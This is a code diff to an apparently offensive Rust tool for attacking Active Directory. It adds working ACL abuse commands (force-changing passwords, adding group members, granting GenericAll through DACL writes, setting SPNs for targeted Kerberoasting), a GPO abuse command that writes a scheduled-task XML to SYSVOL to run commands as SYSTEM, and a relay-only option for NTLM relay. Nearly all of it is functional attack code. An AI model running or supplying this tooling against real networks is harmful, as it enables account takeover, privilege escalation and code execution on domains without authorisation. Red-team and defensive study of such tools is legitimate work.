@@ -398,6 +398,21 @@ enum Commands {
         action: C2Action,
     },
 
+    // ─── NEW: ACL Abuse ──────────────────────────────────────
+    /// ACL/DACL abuse — force-change passwords, add group members, write DACLs
+    #[command(alias = "dacl")]
+    Acl {
+        #[command(subcommand)]
+        action: AclAction,
+    },
+
+    // ─── NEW: GPO Abuse ──────────────────────────────────────
+    /// Group Policy abuse — write ImmediateTask XML to SYSVOL for code execution
+    Gpo {
+        #[command(subcommand)]
+        action: GpoAction,
+    },
+
     // ─── Shell completion generation ────────────────────────
     /// Generate shell tab-completion scripts
     #[command(name = "completions", alias = "completion", hide = true)]
@@ -726,6 +741,9 @@ enum NtlmAction {
         /// Port to listen on
         #[arg(short, long, default_value = "445")]
         port: u16,
+        /// Relay-only mode: skip poisoner/responder, use pre-captured hashes
+        #[arg(long)]
+        no_poison: bool,
     },
     /// Relay NTLM authentication to targets
     Relay {
@@ -738,6 +756,9 @@ enum NtlmAction {
         /// Command to execute on successful relay
         #[arg(short, long)]
         command: Option<String>,
+        /// Relay-only mode: skip poisoner/responder, use pre-captured hashes
+        #[arg(long)]
+        no_poison: bool,
     },
     /// SMB-specific relay with signing bypass
     SmbRelay {
@@ -1157,6 +1178,117 @@ enum C2Action {
 }
 
 // ──────────────────────────────────────────────────────────
+// ACL sub-commands
+// ──────────────────────────────────────────────────────────
+
+#[derive(Subcommand, Clone)]
+enum AclAction {
+    /// Force-change a user's password (requires ForceChangePassword extended right or GenericAll)
+    ForcePassword {
+        /// Target user DN or sAMAccountName
+        #[arg(short, long, required = true)]
+        target: String,
+        /// New password to set
+        #[arg(short, long, required = true)]
+        password: String,
+    },
+    /// Add a user to a group (requires WriteProperty/member or GenericAll)
+    AddMember {
+        /// Group DN
+        #[arg(short, long, required = true)]
+        group: String,
+        /// Member DN to add
+        #[arg(short, long, required = true)]
+        member: String,
+    },
+    /// Remove a user from a group
+    RemoveMember {
+        /// Group DN
+        #[arg(short, long, required = true)]
+        group: String,
+        /// Member DN to remove
+        #[arg(short, long, required = true)]
+        member: String,
+    },
+    /// Grant GenericAll to a trustee on a target object (requires WriteDACL)
+    WriteDacl {
+        /// Target object DN
+        #[arg(short, long, required = true)]
+        target: String,
+        /// Trustee sAMAccountName (resolved to SID automatically)
+        #[arg(long, required = true)]
+        trustee: String,
+    },
+    /// Set an SPN on a user for targeted Kerberoasting (requires WriteProperty/SPN or GenericAll)
+    WriteSpn {
+        /// Target user DN
+        #[arg(short, long, required = true)]
+        target: String,
+        /// SPN to add (e.g. cifs/fake.corp.local)
+        #[arg(short = 's', long, required = true)]
+        spn: String,
+    },
+    /// Remove an SPN from a user (cleanup)
+    RemoveSpn {
+        /// Target user DN
+        #[arg(short, long, required = true)]
+        target: String,
+        /// SPN to remove
+        #[arg(short = 's', long, required = true)]
+        spn: String,
+    },
+    /// Enumerate abusable ACEs for the current/specified trustee SID
+    Enum {
+        /// SID to check (default: current user's SID from --domain/--username)
+        #[arg(long)]
+        sid: Option<String>,
+    },
+}
+
+// ──────────────────────────────────────────────────────────
+// GPO sub-commands
+// ──────────────────────────────────────────────────────────
+
+#[derive(Subcommand, Clone)]
+enum GpoAction {
+    /// Enumerate all GPOs and their links
+    Enum,
+    /// Write an ImmediateTask XML to SYSVOL for code execution via Computer/User GPO
+    Write {
+        /// GPO name or CN (e.g. {GUID} or display name)
+        #[arg(short, long, required = true)]
+        gpo: String,
+        /// SYSVOL share path (e.g. \\dc01.corp.local\SYSVOL\corp.local\Policies)
+        #[arg(long, required = true)]
+        sysvol: String,
+        /// Command to execute (runs as SYSTEM for Computer GPO)
+        #[arg(short, long, required = true)]
+        command: String,
+        /// Task name (appears in Windows Task Scheduler briefly)
+        #[arg(long, default_value = "OT-Maint")]
+        task_name: String,
+        /// Apply to User policy directory instead of Machine
+        #[arg(long)]
+        user_policy: bool,
+    },
+    /// Remove a previously-written ImmediateTask XML (cleanup)
+    Cleanup {
+        /// GPO name or CN
+        #[arg(short, long, required = true)]
+        gpo: String,
+        /// SYSVOL share path
+        #[arg(long, required = true)]
+        sysvol: String,
+        /// Task name to remove
+        #[arg(long, default_value = "OT-Maint")]
+        task_name: String,
+        /// Was written to User policy directory
+        #[arg(long)]
+        user_policy: bool,
+    },
+}
+
+// ──────────────────────────────────────────────────────────
 // Main
 // ──────────────────────────────────────────────────────────
 
@@ -1341,6 +1473,12 @@ async fn async_main() {
             commands_impl::cmd_c2(&mut c2_manager, action.clone()).await
         }
 
+        // ─── ACL abuse handler ───────────────────────────────
+        Commands::Acl { ref action } => cmd_acl(&cli, action.clone()).await,
+
+        // ─── GPO abuse handler ───────────────────────────────
+        Commands::Gpo { ref action } => cmd_gpo(&cli, action.clone()).await,
+
         // ─── Shell completion generation ─────────────────────
         Commands::Completions {
             shell,
@@ -1503,12 +1641,12 @@ async fn cmd_ntlm(action: NtlmAction) -> i32 {
     banner::print_module_banner("NTLM RELAY");
 
     match action {
-        NtlmAction::Capture { interface, port } => {
+        NtlmAction::Capture { interface, port: _, no_poison } => {
             println!(
-                "{} Starting NTLM capture on {}:{}",
+                "{} Starting NTLM capture on {} {}",
                 "🎯".bright_black(),
                 interface.cyan(),
-                port.to_string().cyan()
+                if no_poison { "(relay-only / no poison)" } else { "" }
             );
             let config = RelayControllerConfig {
                 interface: interface.clone(),
@@ -1520,6 +1658,7 @@ async fn cmd_ntlm(action: NtlmAction) -> i32 {
                 challenge: None,
                 wpad_script: None,
                 downgrade_auth: false,
+                no_poison,
             };
             let mut controller = RelayController::new(config);
             match controller.initialize().await {
@@ -1543,11 +1682,13 @@ async fn cmd_ntlm(action: NtlmAction) -> i32 {
             targets,
             port: _,
             command,
+            no_poison,
         } => {
             println!(
-                "{} Starting NTLM relay to {} targets",
+                "{} Starting NTLM relay to {} targets {}",
                 "🎯".bright_black(),
-                targets.join(", ").cyan()
+                targets.join(", ").cyan(),
+                if no_poison { "(relay-only)" } else { "" }
             );
 
             let relay_targets: Vec<RelayTarget> = targets
@@ -1582,6 +1723,7 @@ async fn cmd_ntlm(action: NtlmAction) -> i32 {
                 challenge: None,
                 wpad_script: None,
                 downgrade_auth: false,
+                no_poison,
             };
 
             let mut controller = RelayController::new(config);
@@ -1636,6 +1778,325 @@ async fn cmd_ntlm(action: NtlmAction) -> i32 {
             }
             banner::print_success("HTTP relay configured");
             0
+        }
+    }
+}
+
+// ──────────────────────────────────────────────────────────
+// ACL Abuse Handler
+// ──────────────────────────────────────────────────────────
+
+async fn cmd_acl(cli: &Cli, action: AclAction) -> i32 {
+    use overthrone_core::proto::ldap::LdapSession;
+
+    banner::print_module_banner("ACL ABUSE");
+
+    let creds = match require_creds(cli) {
+        Ok(c) => c,
+        Err(e) => return e,
+    };
+    let dc = match require_dc(cli) {
+        Ok(d) => d,
+        Err(e) => return e,
+    };
+
+    let mut ldap = match LdapSession::connect(
+        &dc,
+        cli.domain.as_deref().unwrap_or(""),
+        &creds.username,
+        creds.password().unwrap_or(""),
+        false,
+    )
+    .await
+    {
+        Ok(s) => s,
+        Err(e) => {
+            banner::print_fail(&format!("LDAP connect failed: {}", e));
+            return 1;
+        }
+    };
+
+    let result = match action {
+        AclAction::ForcePassword { target, password } => {
+            println!(
+                "{} Force-changing password for {} ...",
+                "[*]".bright_black(),
+                target.cyan()
+            );
+            ldap.force_change_password(&target, &password).await
+        }
+        AclAction::AddMember { group, member } => {
+            println!(
+                "{} Adding {} to group {} ...",
+                "[*]".bright_black(),
+                member.cyan(),
+                group.yellow()
+            );
+            ldap.add_member_to_group(&group, &member).await
+        }
+        AclAction::RemoveMember { group, member } => {
+            println!(
+                "{} Removing {} from group {} ...",
+                "[*]".bright_black(),
+                member.cyan(),
+                group.yellow()
+            );
+            ldap.remove_member_from_group(&group, &member).await
+        }
+        AclAction::WriteDacl { target, trustee } => {
+            println!(
+                "{} Granting GenericAll to '{}' on '{}' ...",
+                "[*]".bright_black(),
+                trustee.cyan(),
+                target.yellow()
+            );
+            // Resolve trustee to binary SID
+            let sid_bytes = match ldap.resolve_object_sid_binary(&trustee).await {
+                Ok(s) => s,
+                Err(e) => {
+                    banner::print_fail(&format!("Failed to resolve SID for '{}': {}", trustee, e));
+                    return 1;
+                }
+            };
+            ldap.write_dacl_grant_generic_all(&target, &sid_bytes).await
+        }
+        AclAction::WriteSpn { target, spn } => {
+            println!(
+                "{} Writing SPN '{}' on '{}' ...",
+                "[*]".bright_black(),
+                spn.cyan(),
+                target.yellow()
+            );
+            ldap.write_spn(&target, &spn).await
+        }
+        AclAction::RemoveSpn { target, spn } => {
+            println!(
+                "{} Removing SPN '{}' from '{}' ...",
+                "[*]".bright_black(),
+                spn.cyan(),
+                target.yellow()
+            );
+            ldap.remove_spn(&target, &spn).await
+        }
+        AclAction::Enum { sid } => {
+            let trustee_sid = sid.unwrap_or_else(|| {
+                println!("{} No SID specified, scanning all objects (may be slow)", "[!]".yellow());
+                "*".to_string()
+            });
+            println!("{} Enumerating abusable ACEs for SID: {}", "[*]".bright_black(), trustee_sid.cyan());
+            match ldap.find_abusable_acls(&trustee_sid).await {
+                Ok(dacls) => {
+                    if dacls.is_empty() {
+                        println!("{} No abusable ACEs found", "[-]".yellow());
+                    } else {
+                        banner::print_success(&format!("Found {} objects with abusable ACLs", dacls.len()));
+                        for dacl in &dacls {
+                            println!("  {} {}", "[+]".green(), dacl.object_dn.cyan());
+                            for ace in &dacl.aces {
+                                println!(
+                                    "      {} {}  mask=0x{:08X}  type={:?}",
+                                    "ACE".yellow(),
+                                    ace.trustee_sid,
+                                    ace.access_mask,
+                                    ace.ace_type
+                                );
+                            }
+                        }
+                    }
+                    return 0;
+                }
+                Err(e) => {
+                    banner::print_fail(&format!("ACL enum failed: {}", e));
+                    return 1;
+                }
+            }
+        }
+    };
+
+    match result {
+        Ok(_) => {
+            banner::print_success("ACL operation completed");
+            0
+        }
+        Err(e) => {
+            banner::print_fail(&format!("ACL operation failed: {}", e));
+            1
+        }
+    }
+}
+
+// ──────────────────────────────────────────────────────────
+// GPO Abuse Handler
+// ──────────────────────────────────────────────────────────
+
+async fn cmd_gpo(cli: &Cli, action: GpoAction) -> i32 {
+    use overthrone_core::proto::ldap::LdapSession;
+
+    banner::print_module_banner("GPO ABUSE");
+
+    let creds = match require_creds(cli) {
+        Ok(c) => c,
+        Err(e) => return e,
+    };
+    let dc = match require_dc(cli) {
+        Ok(d) => d,
+        Err(e) => return e,
+    };
+
+    match action {
+        GpoAction::Enum => {
+            let mut ldap = match LdapSession::connect(
+                &dc,
+                cli.domain.as_deref().unwrap_or(""),
+                &creds.username,
+                creds.password().unwrap_or(""),
+                false,
+            )
+            .await
+            {
+                Ok(s) => s,
+                Err(e) => {
+                    banner::print_fail(&format!("LDAP connect failed: {}", e));
+                    return 1;
+                }
+            };
+            match ldap.enumerate_gpos().await {
+                Ok(gpos) => {
+                    banner::print_success(&format!("Found {} GPOs", gpos.len()));
+                    for g in &gpos {
+                        println!(
+                            "  {} {} ({}) → {}",
+                            "[+]".green(),
+                            g.display_name.cyan(),
+                            g.cn.bright_black(),
+                            g.gpc_file_sys_path.yellow()
+                        );
+                    }
+                    0
+                }
+                Err(e) => {
+                    banner::print_fail(&format!("GPO enum failed: {}", e));
+                    1
+                }
+            }
+        }
+        GpoAction::Write {
+            gpo,
+            sysvol,
+            command,
+            task_name,
+            user_policy,
+        } => {
+            use overthrone_core::proto::gpo_write;
+            use overthrone_core::proto::smb::SmbSession;
+
+            let target_dc = dc.clone();
+            println!(
+                "{} Writing ImmediateTask '{}' to GPO '{}' on SYSVOL ...",
+                "[*]".bright_black(),
+                task_name.cyan(),
+                gpo.yellow()
+            );
+            println!("    Command: {}", command.bright_red());
+
+            let smb = match SmbSession::connect(
+                &target_dc,
+                cli.domain.as_deref().unwrap_or(""),
+                &creds.username,
+                creds.password().unwrap_or(""),
+            )
+            .await
+            {
+                Ok(s) => s,
+                Err(e) => {
+                    banner::print_fail(&format!("SMB connect failed: {}", e));
+                    return 1;
+                }
+            };
+
+            // Resolve the SYSVOL share path (strip \\host\SYSVOL prefix)
+            let share = "SYSVOL";
+            let policy_subdir = if user_policy { "User" } else { "Machine" };
+            let task_xml_path = format!(
+                "{}\\Policies\\{}\\{}\\Preferences\\ScheduledTasks\\ScheduledTasks.xml",
+                sysvol.trim_end_matches('\\'),
+                gpo,
+                policy_subdir
+            );
+            // Extract just the path relative to SYSVOL share root
+            let rel_path = task_xml_path
+                .trim_start_matches(&format!("\\\\{}\\{}", target_dc, share))
+                .trim_start_matches('\\')
+                .to_string();
+
+            let xml = gpo_write::build_immediate_task_xml(&task_name, &command);
+
+            match smb.write_file(share, &rel_path, xml.as_bytes()).await {
+                Ok(_) => {
+                    banner::print_success(&format!(
+                        "ImmediateTask XML written to {}\\{}",
+                        share, rel_path
+                    ));
+                    println!("    {} Waiting for Group Policy refresh (90s default) ...", "[!]".yellow());
+                    0
+                }
+                Err(e) => {
+                    banner::print_fail(&format!("SYSVOL write failed: {}", e));
+                    1
+                }
+            }
+        }
+        GpoAction::Cleanup {
+            gpo,
+            sysvol,
+            task_name,
+            user_policy,
+        } => {
+            use overthrone_core::proto::smb::SmbSession;
+
+            let target_dc = dc.clone();
+            println!(
+                "{} Removing ImmediateTask '{}' from GPO '{}' ...",
+                "[*]".bright_black(),
+                task_name.cyan(),
+                gpo.yellow()
+            );
+
+            let smb = match SmbSession::connect(
+                &target_dc,
+                cli.domain.as_deref().unwrap_or(""),
+                &creds.username,
+                creds.password().unwrap_or(""),
+            )
+            .await
+            {
+                Ok(s) => s,
+                Err(e) => {
+                    banner::print_fail(&format!("SMB connect failed: {}", e));
+                    return 1;
+                }
+            };
+
+            let share = "SYSVOL";
+            let policy_subdir = if user_policy { "User" } else { "Machine" };
+            let rel_path = format!(
+                "{}\\Policies\\{}\\{}\\Preferences\\ScheduledTasks\\ScheduledTasks.xml",
+                sysvol.trim_start_matches(&format!("\\\\{}\\{}", target_dc, share))
+                    .trim_start_matches('\\'),
+                gpo,
+                policy_subdir
+            );
+
+            match smb.delete_file(share, &rel_path).await {
+                Ok(_) => {
+                    banner::print_success("ImmediateTask XML removed from SYSVOL");
+                    0
+                }
+                Err(e) => {
+                    banner::print_fail(&format!("SYSVOL cleanup failed: {}", e));
+                    1
+                }
+            }
         }
     }
 }
